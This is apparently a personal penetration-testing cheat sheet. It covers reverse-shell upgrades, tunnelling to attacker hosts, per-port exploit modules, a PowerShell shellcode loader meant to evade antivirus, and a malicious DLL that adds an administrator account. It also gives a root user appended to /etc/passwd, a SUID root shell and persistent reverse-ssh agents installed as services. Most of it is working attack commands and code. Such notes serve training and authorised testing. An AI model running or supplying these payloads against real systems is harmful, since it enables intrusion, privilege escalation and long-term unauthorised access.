# General
#linux
### Shell-Upgrade
* **requires python or other interpreted language installed on the victim machine.**
```bash
# In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
# In Kali
stty raw -echo
fg
# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty columns [height] rows [width]
```
- Alternatively, one can replace `python -c 'import pty; pty.spawn("/bin/bash")'` with `script -q /dev/null -c /bin/bash`
### Port-Forward
#### socat
- On the compromised machine.
```bash
socat -ddd TCP-LISTEN:[Local_Port],fork TCP:[DESTINATION_IP]:[DESTINATION_PORT]
```
#### netcat + FIFO 
#linux 
- On the compromised machine.
```bash
rm /tmp/f;mkfifo /tmp/f;nc -lk -p [Local_Port] < /tmp/f | nc [DESTINATION_IP] [DESTINATION_PORT] > /tmp/f
```
#### netsh
#windows 
- Native way that requires **administrative privileges** to create a port forward on Windows.
```bash
netsh interface portproxy add v4tov4 listenaddress=[LOCAL_IP] listenport=[LOCAL_PORT] connectaddress=[DESTINATION_SERVER] connectport=[DESTINATION_PORT]
# Optionally, poke a hole in firewall if necessary.
netsh advfirewall firewall add rule name="[Rule_Name]" protocol=TCP dir=in localip=[IP] localport=[PORT] action=allow
```
### Tunneling
#### SSH
- On the attacker machine.
- <mark>Local Port Forward</mark>
```bash
# forward a port from the client machine to the server machine. Essentially, it allows you to connect from your client machine to another server from an intermediate machine (the SSH server).
ssh -v -N -L [SSH_Client_PORT]:[DESTINATION_IP]:[DESTINATION_PORT] [USERNAME]@[TARGET]
```
- <mark>Remote Port Forward</mark>
```bash
# forward a port from the server machine to the client machine. Essentially, it allows external users to connect to a certain port on your client machine from an intermediate machine (the SSH server).
ssh -v -N -R [SSH_SERVER_PORT]:[DESTINATION_IP]:[DESTINATION_PORT] [USERNAME]@[TARGET]
```
- <mark>Dynamic Port Forward</mark>
```bash
# sets up your SSH connection as a SOCKS proxy.This can be beneficial if you're in a network that restricts your access to certain sites.
ssh -v -N -D [SSH_CLIENT_PORT] [USERNAME]@[TARGET]
# However, not all applications natively support routing their traffic through a SOCKS proxy. That's where tools like `proxychains` comes into play.
# It won't work on statically-linked binaries since it uses the Linux shared object preloading technique (LD_PRELOAD) to hook dynamically-linked libc networking functions within the binary that gets passed to it
1. modify the `/etc/proxychains.conf`
2. proxychains command_you_want_to_run
```
- <mark>Remote Dynamic Port Forward</mark>
	```bash
	ssh -v -N [USERNAME]@[TARGET] -R [SSH_SERVER_PORT] 
	```
#### sshuttle
-  <mark>Local Port Forward</mark>
```bash
# Specifying the SSH connection string we want to use, as well as the subnets that we want to tunnel through this connection.
# Setting up local routes that force traffic through the SSH tunnel, hence no need for `proxychains` anymore.
# `-D `allows `sshuttle` to run in the background.
sshuttle -r -D [USERNAME]@[TARGET] [CIDR_Subnet] [CIDR_Subnet] 
```
#### chisel
 - https://github.com/jpillora/chisel
- <mark>Local Port Forward</mark>
```bash
# Server
chisel server --port [LOCAL_PORT] --reverse
# Client
chisel client [SERVER_IP]:[SERVER_PORT] [LOCAL_PORT]:[DESTINATION_SERVER]:[DESTINATION_PORT]
```
- <mark>Remote Port Forward</mark>
```bash
# Server
chisel server --port [LOCAL_PORT] --reverse
# Client
chisel client [SERVER_IP]:[SERVER_PORT] R:[CHISEL_SERVER_PORT]:[DESTINATION_SERVER]:[DESTINATION_PORT]
```
- <mark>Local Dynamic Port Forward</mark>
```bash
# Server
chisel server --port [LOCAL_PORT] --reverse --socks5
# Client
chisel client [SERVER_IP]:[SERVER_PORT] [CHISEL_CLIENT_PORT]:socks
```
- <mark>Remote Dynamic Port Forward</mark>
```bash
# Server
chisel server --port [Local_Port] --reverse --socks5
# Client
chisel client [SERVER_IP]:[SERVER_PORT] R:[CHISEL_SERVER_PORT]:socks
```
#### plink.exe
#windows 
-  <mark>Local Port Forward</mark>
```bash
.\plink.exe -ssh -v -N [USERNAME]@[TARGET] -L [SSH_CLIENT_PORT]:[DESTINATION_SERVER]:[DESTINATION_PORT] 
```
- <mark>Remote Port Forward</mark>
```bash
.\plink.exe -ssh -v -N [USERNAME]@[TARGET] -R [SSH_SERVER_PORT]:[DESTINATION_SERVER]:[DESTINATION_PORT] 
```
- <mark>Dynamic Port Forward</mark>
```bash
#sets up your SSH connection as a SOCKS proxy.This can be beneficial if you're in a network that restricts your access to certain sites.
.\plink.exe -ssh -v -N [USERNAME]@[TARGET] -D [SSH_CLIENT_PORT]
#However, not all applications natively support routing their traffic through a SOCKS proxy. That's where tools like `proxychains` come into play.
1. modify the `/etc/proxychains.conf`
2. proxychains command_you_want_to_run
```
#### ligolo-ng
```shell
# Attacker Machine
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up
./ligolo-proxy -selfcert
# Victim Machine
# Linux: 
	nohup ./agent -ignore-cert -connect [attack_IP]:11601 &
# Windows:
	1. Start-Process -FilePath "[Path_To_agent]" -ArgumentList "-ignore-cert -connect [attack_IP]:11601" -NoNewWindow
	2. # Completely detach from session
		1. sc.exe create ssh binPath= "[Path_To_agent] -ignore-cert -connect [attack_IP]:11601" start=auto
		2. sc.exe start ssh
# After connection
session [ID]
sudo ip route add [remote_address] dev ligolo
start_tunnel
```
# Port-Specific
### Port-21-FTP
- <mark>Reconnaissance</mark>
```bash
#Check for FTP Anonymous Login
nmap -script ftp-anon <IP address> -p 21
```
- <mark>Exploit</mark>
```bash
#vsftpd V2.3.4 is vulnerable to command execution facilitated by a malicious backdoor through a supply chain attack
searchsploit -m 49757
	OR
exploits/unix/ftp/vsftpd_234_backdoor
```
### Port-25-SMTP
- <mark>Reconnaissance</mark>
```bash
#Enumerate SMTP users
auxiliary/scanner/smtp/smtp_enum
# Interesting commands:
# VRFY: VRFY request asks the server to verify an email address
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient 
# EXPN: EXPN asks the server for the membership of a mailing list
```
- <mark>Exploit</mark>
```bash
#Haraka prior to V2.8.9 is vulnerable to RCE due to a plugin used to process attachments
exploit/linux/smtp/haraka
```
### Port-22-SSH
- <mark>Reconnaissance</mark>
```bash

```
- <mark>Exploit</mark>
```bash
#libssh V0.6.0-0.8.0 is vulnerable to an authentication bypass vulnerability in the server code that can be exploited to achieve RCE
auxiliary/scanner/ssh/libssh_auth_bypass
```
```bash
#OpenSSH 7.2p1 - (Authenticated) xauth Command Injection
searchsploit -m 39569
```
### Port-53-DNS
- <mark>Reconnaissance</mark>
	- `dig`
	```bash
	# Ask the DNS server to return all the available entries that it is willing to disclose.
	dig any [Domain Name] @[DNS_IP]
	# Try zone transfer without domain 
	dig axfr @<DNS_IP> 
	# Try zone transfer with the domain
	dig axfr @<DNS_IP> <DOMAIN> 
	```
	- `host`: Linux-based
	```bash
	# Find the IP address of a domain.
	host [Domain Name]
	# Query other record types by using the -t option
	host -t [Type e.g. MX/TXT] [Domain Name]
	# Brute-forcing sub-domains with Bash one-liner
	for ip in $(cat [wordlist]); do host $ip.[Domain Name]; done | grep -v "not found"
	# If PTR records are configured and we know the IP range, reverse lookups are more efficient in finding hostnames.
	 for ip in $(seq start end); do host [Target Range].$ip; done | grep -v "not found"
	```
	- `nslookup`: Windows-based
	```bash
	# Find the IP address of a domain.
	nslookup [Domain Name]
	# Query other record types by using the -type option
	nslookup -type=[Type] [Domain Name] [DNS_IP]
	# Brute-forcing can be done the same way using Powershell or Batch scripts.
	```
	 - `DNSRecon`: automation on Kali
	 ```bash
	 # Standard enumeration against target domain
	 dnsrecon -d [Domain Name] -t std
	 # Brute-forcing sub-domains
	 dnsrecon -d [Domain Name] -D [wordlist] -t brt
	```
### Port-69-UDP-TFTP
- <mark>Reconnaissance</mark>
```bash
#TFTP doesn't provide directory listing so the script `tftp-enum` from `nmap` will try to brute-force default paths
nmap -script tftp-enum <IP address> -p 69
```
- <mark>Exploit</mark>
```bash

```
### Port-80-HTTP
- <mark>Reconnaissance</mark>
```bash
#Enumerates directories used by popular web applications and servers
#works great as a complement to other directory brute-forcing tool as it sometimes can identify specific versions of Web applications
nmap --script http-enum <IP address> -p 80
```
- <mark>Exploit</mark>
	- Shellshock 
	```bash
	#Testing Payload
	User-Agent:() { :;};echo -e "\r\nHello"
	```
### Port-161/162-UDP-SNMP
- <mark>Reconnaissance</mark>
	- `onesixtyone`
	```bash
	# Brute force SNMP community strings with `onesixtyone`
	onesixtyone [IP Address/Range] -c [Community String Wordlist]
	```
	- `snmpwalk`
		-  Microsoft Windows SNMP parameters![[Pasted image 20240116222527.png]]
	```bash
	# Query for ALL MIB data with SNMPv1
	snmpwalk -c [Community String] -v1 -t 10 [IP address]
	# Query for specific MIB data with SNMPv1
	snmpwalk -c [Community String] -v1 -t 10 [IP address] [MIB Value]
	# !!!! Enumerate even more about the system !!!!
	snmpwalk -v X -c [Community String] <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
	```
### Port-443-HTTPS

### Port-139/445-SMB
- <mark>NetBIOS Reconnaissance</mark>
```bash
# Query the NetBIOS name service for valid NetBIOS names
nbtscan -r [IP Range]
```
- <mark>SMB Reconnaissance</mark>
```bash
# Active Information Gathering
enum4linux
```
```bash
#nmap script for common vulnerabilities
nmap --script smb-vuln-* <target> -p 445
```
- <mark>Exploit</mark>
```bash
#Windows MS17-010 (EternalBlue)
exploit/smb/ms17_010_eternalblue
#Variants of Eternalblue exploits
https://github.com/helviojunior/MS17-010
```

```bash
#Windows ms08-067
exploit/windows/smb/ms08_067_netapi
```

```bash
#Samba (version 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14) is vulnerable to RCE
exploit/linux/samba/is_known_pipename
```

```bash
#Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution 
exploit/multi/samba/usermap_script
```
### Port-1433-MSSQL
 - <mark>Reconnaissance</mark>
```bash
#Attempts to authenticate to Microsoft SQL Servers using an empty password for the sysadmin (sa) account
nmap --script ms-sql-empty-password <IP address> -p 1433
```

```bash
#Dumps the password hashes from an MS-SQL server in a format suitable for cracking by tools such as John-the-ripper
nmap --script ms-sql-dump-hashes --script-args mssql.username=<username>,mssql.pass=<password> <IP address> -p 1433
```

```bash
#Sometimes database is only listening for local connections, use following command to check for existence
netstat -tlnpu
ss -tlnpu
```
- <mark>Exploit</mark>
```bash

```
### Port-1521-Oracle TNS Listener
 - <mark>Reconnaissance</mark>
```bash
#SID Bruteforce
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
```
### Port-3306-MySQL
- <mark>Reconnaissance</mark>
```bash
#Checks for MySQL servers with an empty password for root or anonymous
nmap --script mysql-empty-password <IP address> -p 3306
```

```bash
#Sometimes database is only listening for local connections, use following command to check for existence
netstat -tlnpu
ss -tlnpu
```
- <mark>Exploit</mark>
```bash

```
### Port-3389-RDP
- <mark>Reconnaissance</mark>
```bash
#Windows CVE-2019-0708 RDP Vulnerability(BlueKeep)
auxiliary/scanner/rdp/cve-2019-0708_bluekeep
```
- <mark>Exploit</mark>
```bash
#Windows CVE-2019-0708 RDP Vulnerability(BlueKeep)
exploit/windows/rdp/cve-2019-0708_bluekeep
```
### Port-3632-distccd
- <mark>Reconnaissance</mark>
```bash
nmap -Pn  --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='<command>'" <target> -p 3632
```
- <mark>Exploit</mark>
```bash
```
### Port-5985-WinRM
- <mark>Reconnaissance</mark>
```bash

```
- <mark>Exploit</mark>
```bash
#Enable WinRM
winrm quickconfig -force
#Obtain Command Shell with legit credentials
evil-winrm -u <username> -p <password> -i <IP address>
evil-winrm -u <username> -H <NTLM Hash> -i <IP address>
```
# AV-Evasion
### Manual PowerShell AV Evasion
```powershell
# Run `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser` before running the `.ps1` script.
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
### Automation
	
- <mark>Shellter</mark>: #windows
	- a dynamic shellcode injection tool that uses a number of novel and advanced techniques to backdoor a valid and non-malicious executable file.
	- `.exe` only
- <mark>Veil</mark>: #windows
	- designed to generate metasploit payloads that bypass common anti-virus solutions.
	- supports various formats including `.exe`, `.ps1`, `.bat`
# Post-Exploitation
### Local-Enumeration
#### Windows
- <mark>System Information</mark>
```shell
#List patch infos:
"Systeminfo"
"wmic qfe get Caption,Description,HotFixID,InstalledOn"
```
- <mark>User & Groups</mark>
```shell
#List current logged-on users
"query user"
#List local user accounts
"net users"
#List local groups
"net localgroup"
#List additional information of the specific user
"net user <username>"
#List users in a specific group
"net localgroup <groupname>"
```
- <mark>Network Information</mark>
```shell
#List network configuration
"ipconfig /all"
#List routing table
"route print"
#List ARP table
"arp -a"
#List open ports/established sessions
"netstat -ano"
#List all listening TCP ports on your system without resolving IP addresses and port numbers to their respective names.
"netstat -tln"
#List firewall rules
"netsh advfirewall show allprofiles"
#Disable firewall
"netsh advfirewall set allprofiles state off"
```
- <mark>Processes & Services </mark>
```shell
#List running services:
"net start"
"wmic service list brief"
#List running processes
"Get-Process"
#With Executable Paht
"Get-CimInstance Win32_Process | Select-Object Name, ExecutablePath"
# pspy equivalent
"Watch-Command -Difference -Continuous -Seconds 0.01 -ScriptBlock {Get-CimInstance Win32_Process | Select-Object Name, ExecutablePath}"
#List scheduled tasks
"schtasks /query /v /fo list"
```
- <mark>Installed applications</mark>
	- Remember to check `32-bit` and `64-bit` `Program Files` directories located in `C:\` along with the `Downloads` directory of the user.
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
- <mark>Sensitive Information</mark>
```powershell
Get-ChildItem -File -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.ini,*.log,*.kdbx,*.pdf,*.xls,*.xlsx,*.doc,*.docx -Path [Path] 
```
- If we have `GUI` access, then use `runas /user:[USERNAME] cmd` to get a new command prompt under that user's security context.
- <mark>PowerShell Artifacts</mark>
```powershell
Get-History
# Clear-History does not clear the command history recorded by PSReadline
# Retrieve path of the history file from PSReadline
(Get-PSReadlineOption).HistorySavePath
```
- <mark>Automation</mark>
```shell
#JAWS: PowerShell script designed to quickly identify potential privilege escalation vectors on Windows systems.
https://github.com/411Hall/JAWS
#winPEAS: Windows Privilege Escalation Awesome Scripts
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
```
#### Linux
- <mark>System Information</mark>
```bash
# Environmental Variables that can sometimes contain credentials
"/env"
#Show hostname
"hostname"
#List release info
"cat /etc/issue"
"cat /etc/*release"
#List kernel version
"uname -a"
#List CPU info
"lscpu"
#List storage info
"df -h"
#List installed packages
"dbkg -l"
```
- <mark>User & Groups</mark>
```bash
# Show user context information
"id"
#List groups that a specific user is a part of
"groups <username>"
#List the set of commands that the current user can run as another user according to the sudoers file
"sudo -l"
#List local groups
"cat /etc/groups"
#List local accounts
"cat /etc/passwd"
#List directories & files belongs to certain user or group
"find / -group [GroupName] 2>/dev/null"
#List local user accounts: 
"cat /etc/passwd | grep -v /nologin"
#List currently logged-on users
"who"
```
- <mark>Network Information</mark>
```bash
# Display network routing tables
"route" or "routel"
#Display active network connections and listening ports
"netstat -tulnp"
"ss -tulnp"
#List network configuration
"cat /etc/networks"
#List ARP table
"arp -n"
#List locally mapped domains
"cat /etc/hosts"
#List default DNS name server address
"cat /etc/resolve.conf"
#Glean information about the firewall rules
"ls /etc/iptables"
```
- <mark>Processes & Cron Jobs</mark>
```bash
#List running processes
"ps aux"
#List scheduled cron jobs: 
"crontab -l" #local 
"ls -al /etc/cron*" #system-wide
# Active Process Monitoring
https://github.com/DominicBreuker/pspy
```
- <mark>Automation</mark>
```bash
#LinEnum: bash script that automates common Linux local enumeration checks in addition to identifying privilege escalation vulnerabilities.
https://github.com/rebootuser/LinEnum
# LinPEAS: script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
```
### PrivEsc-Windows
#### Service Binary Hijacking
- List Running Services
```powershell
Get-CimInstance win32_service | Select Name,StartName,PathName,State | Where-Object {$_.State -like 'Running'}
```
- Inspecting Binary Permissions
```powershell
Get-Acl [Binary_Path] | Select-Object -ExpandProperty Access | Select-Object FileSystemRights, AccessControlType, IdentityReference | Format-Table -AutoSize
```
- Inspecting Service Start Mode
```powershell
Get-CimInstance win32_service | Select Name, StartMode | Where-Object {$_.Name -like '[Service_Name]'}
```
#### Service DLL Hijacking
- `DLL Overwrite`
- `DLL Search Order Hijack`
	- `Missing DLL` is considered a special case.
		- `Process Monitor` can be useful in identifying DLLs loaded and ones that are missing. 
		- However, `Process Monitor` requires Administration privilege, hence, the executable is usually transferred to the attacker machine to perform the above step.
	- <mark>Note</mark>: Below is the standard search order. However, when safe DLL search mode is **disabled**, the `current directory` is searched at position 2.
	1. The directory from which the application loaded.
	2. The system directory.
	3. The 16-bit system directory.
	4. The Windows directory. 
	5. The current directory.
	6. The directories that are listed in the PATH environment variable.
- Compile following with `x86_64-w64-mingw32-gcc myDLL.cpp --shared -o [Name].dll`
```C++
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
	switch ( ul_reason_for_call )
	{
		case DLL_PROCESS_ATTACH: // A process is loading the DLL.
		int i;
		i = system ("net user hacker hacker /add");
		i = system ("net localgroup administrators hacker /add");
		break;
		case DLL_THREAD_ATTACH: // A process is creating a new thread.
		break;
		case DLL_THREAD_DETACH: // A thread exits normally.
		break;
		case DLL_PROCESS_DETACH: // A process unloads the DLL.
		break;
	}
	return TRUE;
}
```
#### Unquoted Service Paths
- Find Unquoted Service Paths.
```powershell
# CMD
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
# Powershell
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object { $_.PathName -and $_.PathName -notmatch '^C:\\Windows\\' -and $_.PathName -notmatch '\"' }
```
#### Scheduled Tasks
- Review all properties of all scheduled tasks as list.
```powershell
schtasks /query /fo LIST /v
```
#### Windows Privilege Abuse
- `SeImpersonatePrivilege`
- `SeBackupPrivilege`
- `SeAssignPrimaryToken`
- `SeLoadDriver`
- `SeDebug`
#### Kernel Exploits
```bash
https://github.com/SecWiki/windows-kernel-exploits
```
#### Automation
- PowerUp.ps1
```powershell
# Set ExecutionPolicy to Bypass
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
# From Meterpreter Shell
execute -f powershell.exe -i -a "-ep Bypass . .\PowerUp.ps1; Invoke-AllChecks" 
# From Command Prompt 
powershell.exe -ep Bypass . .\PowerUp.ps1; Invoke-AllChecks
# Within PowerShell
. .\PowerUp.ps1; Invoke-AllChecks
```
- Local Exploit Suggester
```bash
https://github.com/bitsadmin/wesng
```

### PrivEsc-Linux
#### Abusing Cron Jobs
```shell
# List scheduled cron jobs: 
crontab -l #local 
ls -al /etc/cron* #system-wide
# Inspect the cron log file (`/var/log/cron.log`) for running cron jobs
grep "CRON" /var/log/syslog
```
#### Abusing Password Authentications
```shell
openssl passwd [Password]
echo "hacker:[Hash]:0:0:root:/root:/bin/bash" >> /etc/passwd
```
#### Setuid and Capabilities
- `Setuid`: When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as the real UID/GID. On the other hand, effective UID/GID represents the actual value being checked when performing sensitive operations.
- `Capabilities`: extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules.
	```shell
	/usr/sbin/getcap -r / 2>/dev/null
	```
#### Sudo Privileges
```shell
sudo -l
https://gtfobins.github.io/
```
#### Kernel Exploits
```shell
# Example
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
#### Automation
- Local Exploit Suggester
	```bash
	https://github.com/The-Z-Labs/linux-exploit-suggester
	```
# Persistence
### reverse-ssh
- https://github.com/Fahrj/reverse-ssh
- Password is `letmeinbrudipls` by default.
- Bind
```shell
# Victim Machine
reverse-sshx64 -l
	OR
reverse-sshx64 -v -l -p 8888
# Attacker Machine
ssh -p 8888 whatever@127.0.0.1
sftp -p 8888 whatever@127.0.0.1
```
- Reverse:
```shell
# Attacker Machine
reverse-sshx64 -l -v -p 22
# Victim Machine
# Linux: 
	nohup ./reverse-sshx64 -p 22 -b [Attacker_Port] whatever@[Attacker_IP] &
# Windows:
	1. Start-Process -FilePath "[Path_To_revSSH]" -ArgumentList "-p 22 -b [Attacker_Port] whatever@[Attacker_IP]" -NoNewWindow
	2. # Completely detach from session
		1. sc.exe create ssh binPath= "[Path_To_revSSH] -p 22 -b [Attacker_Port] whatever@[Attacker_IP]" start=auto
		2. sc.exe start ssh
# Attacker Machine
ssh -p [Chosen_Attacker_Port] whatever@127.0.0.1
sftp -P [Chosen_Attacker_Port] whatever@127.0.0.1
```
### RDP
- Privileged Access Required
```powershell 
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
# Sometimes the RDP connection may be blocked by Windows Firewall
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
### SUID Binary
```C
#include <unistd.h>
int main(void){ 
	setresuid(0, 0, 0); 
	system("/bin/bash"); 
}
```
